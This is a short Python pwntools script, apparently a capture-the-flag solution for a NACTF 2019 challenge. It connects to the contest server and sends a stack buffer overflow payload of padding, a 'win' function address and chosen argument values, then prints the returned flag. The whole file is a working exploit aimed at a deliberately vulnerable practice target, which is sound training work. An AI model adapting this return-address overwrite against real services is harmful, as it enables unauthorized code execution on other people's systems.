#!/usr/bin/python
from pwn import *

p = remote("shell.2019.nactf.com", 31184)

win_addr = 0x80491c2
arg1 = 0x14b4da55
arg2 = 0xf00db4be

payload = "A"*28
payload += p32(win_addr)
payload += p32(win_addr+8)
payload += p64(arg1)
payload += p32(arg2)

print("[*] sending payload..")
p.sendline(payload)
print("[*] done.")

flag = p.recvall()
print("[*] output: " + flag)
p.clean()
p.close()
